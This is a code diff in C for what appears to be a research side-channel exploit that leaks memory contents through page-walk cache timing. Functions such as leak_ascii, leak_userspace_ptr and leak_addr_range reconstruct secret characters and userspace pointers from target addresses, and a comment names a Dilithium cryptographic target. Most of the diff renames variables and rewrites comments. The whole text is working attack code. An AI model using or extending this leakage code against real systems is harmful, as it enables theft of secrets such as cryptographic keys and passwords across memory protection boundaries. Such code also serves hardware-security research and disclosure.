@@ -37,9 +37,9 @@ struct pwsc_ans leak_pwsc_ptr(uint64_t addr, uint64_t *init_noise_filter) {
  *  Inputs:     Address under target, initial noise filter config, expected VPN4 value
  *  Outputs:    pwsc_ans with a complete VPN4 value and VPN3 cache set value. This allows the caller 
  *              to reconstruct one ASCII character
- *  Assumptions: `expected_vpn4_value` is set to `ncache_lines` if there is not an expected value
+ *  Assumptions: `expected_vpn4_set` is set to `ncache_lines` if there is not an expected value
  */
-struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t expected_vpn4_value) {
+struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t expected_vpn4_set) {
     
     // Determine VPN4 cache set (this leaks the initial 6 bits of the ascii character)
     struct pwsc_ans init_pwsc_ans; init_pwsc_ans.va.va = 0; init_pwsc_ans.num_lines_found = 0;
@@ -48,11 +48,11 @@ struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t 
         init_pwsc_ans.va.vpn4_set = initial_line;
         init_pwsc_ans.num_lines_found = 1;
 
-        if(expected_vpn4_value != ncache_lines && initial_line != expected_vpn4_value)
+        if(expected_vpn4_set != ncache_lines && initial_line != expected_vpn4_set)
             fprintf(stderr, "[WARNING] previous line does not match this line\n");
     }
     else {
-        init_pwsc_ans.va.vpn4_set = expected_vpn4_value;
+        init_pwsc_ans.va.vpn4_set = expected_vpn4_set;
         init_pwsc_ans.num_lines_found = 0;
     }
     
@@ -88,62 +88,41 @@ struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t 
 }
 
 
-/*
-    leak_userspace_ptr: Leak full ptr of something that is in userspace 
-    input: addr, init_noise_filter, and expected_vpn4_line (the expected signal vpn4)
-    output: return pwsc_ans with leaked bits --> if kernel pointer we only leak 6 bits of every VPN that is mapped
-
-    TODO we know some of the earlier bits --> allow that to be passed in instead of expected_vpn4_line 
-
-    TODO technically just a code name for the memory map order oracle TBH
-*/
-struct pwsc_ans leak_userspace_ptr(uint64_t addr, uint64_t *init_noise_filter, uint64_t expected_vpn4_line) {
-    // check depth + assert userspace 
+// TODO THIS IS JUST THE MAPPING ORDER ORACLE :|
+struct pwsc_ans leak_userspace_ptr(uint64_t addr, uint64_t *init_noise_filter, uint64_t expected_vpn4_set) {
+    // Leak whatever is mapped (lose the cache offsets here)
     struct pwsc_ans init_profile = leak_pwsc_ptr(addr, init_noise_filter);
+    if(init_profile.va.vpn4_set != expected_vpn4_set) 
+        fprintf(stderr, "[WARNING] previous line does not match this line\n");
+    // You can add more complex handling, for example sometimes things are reordered.
+    // I chose to not add more complex handling here and just decide to give up lol.
+    // It doesn't seem to have that big of a hit on performance and helps improve speed.  
 
-    // extract previous line + take in previous information if we have it 
-    uint8_t vpn4_from_previous_info = 0; // track if vpn4 is from previous info for CO calculations
-    if(init_profile.num_lines_found == 0) { // check to make sure we found something 
-        // init_profile.va.vpn4_set = (uint8_t)expected_vpn4_line;
-        // if(expected_vpn4_line != ncache_lines) init_profile.num_lines_found = 1;
-        // vpn4_from_previous_info = 1; 
-        // TODO reimplement this in the future 
-    }
-    else if(init_profile.va.vpn4_set != expected_vpn4_line) // just display a warning here 
-        fprintf(stderr, "[WARNING] previous line does not match this line\n"); // TODO retry if this is hit
-
-    // kernel space pointer
+    // Don't attempt to use the mapping order oracle on kernel pointers 
     if(init_profile.va.vpn4_set > 31 && init_profile.num_lines_found == 1) 
         return init_profile; 
 
-    // userspace pointer gate --> return nothing for safety 
-    if(init_profile.va.vpn4_set > 31 || init_profile.num_lines_found != 1) {
+    // If we found multiple cache sets (lines) then we either don't know the 
+    // cache offsets. Then we should return all zeros to not claim to know anything
+    if(init_profile.num_lines_found != 1) {
         init_profile.va.va = 0; 
         return init_profile;
     }
 
-    // Set up return 
+    // Memory mapping order oracle 
     struct pwsc_ans ret = init_profile; 
+    uint64_t previous_set = ret.va.vpn4_set; 
+    for(int cur_depth = ret.num_lines_found; cur_depth <= 4; cur_depth++) {
+        for(uint8_t co_guess = 0; co_guess < 8; co_guess++) {
 
-    // set up previous line or early return
-    uint64_t previous_line = ncache_lines; 
-    if(init_profile.num_lines_found == 1) previous_line = init_profile.va.vpn4_set;
-    else if(init_profile.num_lines_found == 2) previous_line = init_profile.va.vpn3_set;
-    else if(init_profile.num_lines_found == 3) previous_line = init_profile.va.vpn2_set;
-    else goto return_ans; // userspace pointer SMAP protection (max is 4 lines) it is a valid pointer so just return what we found 
-
-    // leak depth 
-    // Should only get CO of VPN2 --> impossible to get PO due to SMAP 
-    for(int cur_depth = init_profile.num_lines_found; cur_depth <= 4; cur_depth++) {
-        for(uint8_t co_guess = 0; co_guess < 8; co_guess++) { // guess current CO values till we find one 
-
-            // fill in guess
+            // Fill in guess
             if(cur_depth == 1) ret.va.vpn4_co = co_guess; 
             else if(cur_depth == 2) ret.va.vpn3_co = co_guess;
             else if(cur_depth == 3) ret.va.vpn2_co = co_guess; 
             else if(cur_depth == 4) ret.va.vpn1_co = co_guess; 
 
-            // Preset next level's set to not a zero set  so that zero chunks aren't accidentally mapped 
+            // Avoid making the memory mapped region result in the nexet vpn set to be 0
+            // which we have trouble handling
             if(cur_depth <= 1) { 
                 ret.va.vpn3_set = 32; 
                 ret.va.vpn3_co = 6;
@@ -157,43 +136,36 @@ struct pwsc_ans leak_userspace_ptr(uint64_t addr, uint64_t *init_noise_filter, u
                 ret.va.vpn1_co = 6;   
             }
 
-            // map it 
-            // TODO implement retry if the mmap fails 
+            // Map the guess 
             char *va_buffer = mmap((void *)ret.va.va, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
             if(va_buffer == (void *)-1) {
-                fprintf(stderr, "mmap in leak depth one failed :(\n");
+                fprintf(stderr, "[ERROR] mmap in leak_userspace_ptr failed :(!\n");
                 goto return_ans; 
             }
-            *va_buffer = 0x5A; // shouldn't be needed passed in populate flag 
+            *va_buffer = 0x5A;
 
-            // check if guess is right 
+            // Check if guess is right 
             uint64_t found_line = leak_pwsc_non_buffered(addr, init_noise_filter); 
             munmap((void *)va_buffer, 4096); 
-
-            // logic --> if found a line that is not the same as the previous line
-            if(found_line != ncache_lines && found_line != previous_line) {
-                fprintf(stderr, "Found non-buffered line: %llu\n", found_line); // TODO remove
-
+            if(found_line != ncache_lines && found_line != previous_set) {
                 if(cur_depth == 1) ret.va.vpn3_set = found_line; 
                 else if(cur_depth == 2) ret.va.vpn2_set = found_line; 
                 else if(cur_depth == 3) ret.va.vpn1_set = found_line; 
                 else if(cur_depth == 4) ret.va.po_set = found_line; 
                 ret.num_lines_found++; 
 
-                // update previous_line
-                previous_line = found_line; 
+                // update previous_set
+                previous_set = found_line; 
                 break; 
-            } else if (found_line == ncache_lines && (cur_depth != 1 || !vpn4_from_previous_info)) { // found zeros lines but expected one line 
-                fprintf(stderr, "[EXIT] Found non-buffered line: %llu\n", found_line); // TODO remove
-
-                // logic: if we find no signal then we have found the correct CO if either we are not depth = 1 (working vpn4_co) OR we are depth = 1 but the vpn4 used is not from previous information 
-                // logic: if the vpn4 is from previous info we should expect no found line as our initial measurements picked up no signal so the current state is no signal 
-                // logic: we know the cache offset is correct but can't continue because we couldn't extract the next line 
+            } else if (found_line == ncache_lines) { 
+                // It may the base that the next vpn set is blocked by the noise filter somehow 
+                // thus no signal tells us that our guess is correct but we can't continue since 
+                // we don't exactly know the next vpn set. 
                 goto return_ans; 
             }
         }
 
-        // found nothing
+        // Found nothing
         if(ret.num_lines_found == (uint64_t)cur_depth) {
             fprintf(stderr, "[WARNING] Unable to determine CO and next cache set\n");
             goto return_ans; 
@@ -201,28 +173,27 @@ struct pwsc_ans leak_userspace_ptr(uint64_t addr, uint64_t *init_noise_filter, u
     }
 
 return_ans:
-    // guard to make sure enough lines are found 
-    // logic: we need at least 2 full PT indexes --> i.e. 3 lines need to be found 
-    // logic: the reason why we only make sure two lines are recorded is because if num_lines_found == 2 then we had an early exit which means we found the full 2 lines anyways
+    // TODO move this to the actual place that uses this instead of applying it boardly --> i.e. to the dilithium code. 
     if(ret.num_lines_found < 3) ret.va.va = 0; // zero it out 
 
-    // zero out PT indexes that haven't been found 
+    // If we don't find a full VPN (including the cache offset) remove additional information 
+    // to avoid reporting incorrect bits. 
     if(ret.num_lines_found < 2) { 
         ret.va.vpn4_co = 0;
         ret.va.vpn3_set = 0; 
         ret.va.vpn3_co = 0;
     }
-    if(ret.num_lines_found < 3) {
+    else if(ret.num_lines_found < 3) {
         ret.va.vpn3_co = 0;
         ret.va.vpn2_set = 0;
         ret.va.vpn2_co = 0; 
     }
-    if(ret.num_lines_found < 4) {
+    else if(ret.num_lines_found < 4) {
         ret.va.vpn2_co = 0;
         ret.va.vpn1_set = 0;
         ret.va.vpn1_co = 0;   
     }
-    if(ret.num_lines_found < 5) {
+    else if(ret.num_lines_found < 5) {
         ret.va.vpn1_co = 0;
         ret.va.po_set = 0;
         ret.va.po_co = 0; 
@@ -234,27 +205,31 @@ return_ans:
 
 struct bit_map* leak_addr_range(uint64_t start_leak, uint64_t end_leak, uint64_t gran, uint64_t *init_noise_filter, uint64_t ascii_flag) {
     if(start_leak == 0) {
-        fprintf(stderr, "start leak can't equal zero or else we will integer overflow!\n");
+        fprintf(stderr, "[ERROR] start_leak can't equal zero or else we will integer overflow!\n");
         return NULL; 
     }
 
-    // create bit map 
+    // Create bit map (to store leaked bits)
     struct bit_map *ret = create_bit_map(end_leak - start_leak); 
     if(!ret) {
-        fprintf(stderr, "Unable to allocate a bit map for leakage...\n");
+        fprintf(stderr, "[ERROR] Unable to allocate a bit map for leakage...\n");
         return NULL; 
     }
     
-    // leak range 
+    // Begin leaking the address range
     int byte_idx = 2;
-    uint64_t previous_line = 64;
-    for(uint64_t cur_addr = end_leak - 1; cur_addr >= start_leak; cur_addr -= gran) { 
-        // calculate advanced noise filter 
+    uint64_t previous_set = 64;
+    for(uint64_t cur_addr = end_leak - 1; cur_addr >= start_leak; cur_addr -= gran) {
+
+        // TODO wtf is the advanced noise filter .... and is this even needed .... 
+        // Calculate possible noise from the PO of the secret's address and mask them out 
+        // with the noise filter. There is additional filtering to be more cautious. 
         int PO = cur_addr % 4096; 
-        int mid = (PO / ncache_lines) % ncache_lines;  // TODO enable this advanced filter via flag! 
-        int advanced_filter[3] = {ncache_lines}; int adv_idx = 0; 
+        int mid = (PO / 64) % ncache_lines;  // TODO enable this advanced filter via flag! 
+        int advanced_filter[3] = {ncache_lines}; 
+        int adv_idx = 0; 
         for(int to_check = mid - 1; to_check <= mid + 1; to_check++)
-            if( (64 * to_check - 7) <= PO && PO <= (64 * (to_check + 1)) ) // TODO recheck these numbers may be overestimating noise sometimes 
+            if( (64 * to_check - 7) <= PO && PO <= (64 * (to_check + 1)) ) // TODO wtf is this .... 
                 advanced_filter[adv_idx++] = to_check;
         for(int i = 0; i < adv_idx; i++) {
             if(i != 0) init_noise_filter[advanced_filter[i] - 1] += 2; 
@@ -262,37 +237,36 @@ struct bit_map* leak_addr_range(uint64_t start_leak, uint64_t end_leak, uint64_t
             if(i != 63) init_noise_filter[advanced_filter[i] + 1] += 2; 
         }
 
-        // retrive secret 
+        // Retrive secret 
         struct pwsc_ans ans = {
             .va = { .va = 0 },
             .num_lines_found = 0
         };
-        if(ascii_flag) ans = leak_ascii(cur_addr, init_noise_filter, previous_line);
-        else ans = leak_userspace_ptr(cur_addr, init_noise_filter, previous_line); // TODO add in ascii hint 
+        if(ascii_flag) ans = leak_ascii(cur_addr, init_noise_filter, previous_set);
+        else ans = leak_userspace_ptr(cur_addr, init_noise_filter, previous_set); // TODO add in ascii hint 
 
-        // in case of larger granularities need additional shifts 
-        if(cur_addr != end_leak - 1) for(int i = 0; i < gran - 1; i++) shift_one_byte(ret); 
+        // In case of larger granularities need additional shifts in the bitmap 
+        if(cur_addr != end_leak - 1) 
+            for(uint64_t i = 0; i < gran - 1; i++) 
+                shift_one_byte(ret); 
 
-        // add it to the map 
-        // only do the check with old values if we aren't the first profiled value 
-        uint64_t status = add_ptr_to_bit_map(ret, ans.va.va, ans.num_lines_found, (cur_addr != end_leak - 1)); // we always expect page walk depth of 2 here
-        // if(status == 1) { // TODO SMARTER ERROR HANDLING HERE!
-        //     fprintf(stderr, "Correctness error, retrying...\n");
-        //     cur_addr++; 
-        // }
+        // Add found bits to the map 
+        // This function also does a correctness check with previously found bits
+        uint64_t status = add_ptr_to_bit_map(ret, ans.va.va, ans.num_lines_found, (cur_addr != end_leak - 1)); 
+        // You can add smarter error handling if we find that the previously found bits don't match the found bits.
         (void) status; 
 
-        // output leaked character
+        // Output leaked character if in ASCII mode
         if(ascii_flag) {
             fprintf(stderr, "Leaked character: <%c> Value: %d\n", (char) ret->bytes[byte_idx], ret->bytes[byte_idx]);
             extract_string(ret);
         }
         byte_idx += gran;
 
-        // set up previous line here
-        previous_line = VPN4_TO_CACHE_LINE((ans.va.va<<8));  
+        // Update previous set
+        previous_set = VPN4_TO_CACHE_LINE((ans.va.va<<8));  
 
-        // clear advanced noise filter
+        // Clear advanced noise filter (TODO this might not be needed)
         for(int i = 0; i < adv_idx; i++) {
             if(i != 0) init_noise_filter[advanced_filter[i] - 1] -= 2; 
             init_noise_filter[advanced_filter[i]] -= 2; 
@@ -304,44 +278,34 @@ struct bit_map* leak_addr_range(uint64_t start_leak, uint64_t end_leak, uint64_t
 }
 
 
-/*
-    Display leaked bits as a string from the byte map + hexdump
-*/
 void extract_string(struct bit_map *map) {
     char string_ans[1024] = {0};
-
-    // ignore the dead bytes 
-    // char *ans = string_ans + 5;
-    // char *ans = string_ans;
     char *ans = NULL;
-     
     fprintf(stderr, "hexdump: ");
-    for(int i = 0; i <= map->cur_pos; i++) { // we need to flip the endianness of the byte map for strings (big endian to little endian )
+
+    // We need to flip the endianness of the byte map for strings (big endian to little endian )
+    for(int i = 0; i <= map->cur_pos; i++) { 
         string_ans[i] = map->bytes[map->cur_pos - i];
         fprintf(stderr, "%02x(%c) ", map->bytes[map->cur_pos - i], (char)map->bytes[map->cur_pos - i]); 
-        if(!ans && string_ans[i] != 0) ans = string_ans + i; // we pick up some bad zeros at the start --> remove them 
+
+        // Remove any bad zeros at the front of the bitmap
+        if(!ans && string_ans[i] != 0) ans = string_ans + i; 
     }
     fprintf(stderr, "\n");
 
-    // output extract string 
+    // Output extract string 
     fprintf(stderr, "Extracted string <%s>\n", ans); 
-
 }
 
-/*
-    Bit accuracy 
-    assumptions: bit_map->size = sizeof(correct)
-*/
+
 double accuracy(struct bit_map *guess, char *correct) {
     double correct_bits = 0.0; 
     double total_bits = (guess->cur_pos - 2) * 8.0; 
-    for(uint64_t i = 2; i < guess->cur_pos; i++) {
-        // fprintf(stderr, "%c %c\n", guess->bytes[guess->cur_pos - i], correct[i ]);
+    for(int64_t i = 2; i < guess->cur_pos; i++) 
+        for(uint64_t shift = 0; shift < 8; shift++) 
+            if( (guess->bytes[guess->cur_pos - i] & (1<<shift)) == (correct[i ] & (1<<shift)) ) 
+                correct_bits += 1.0;
 
-        for(uint64_t shift = 0; shift < 8; shift++) {
-            if( (guess->bytes[guess->cur_pos - i] & (1<<shift)) == (correct[i ] & (1<<shift))) correct_bits += 1.0;
-        }
-    }
     fprintf(stderr, "Stats: %f/%f\n", correct_bits, total_bits);
     return (correct_bits / total_bits);
 }
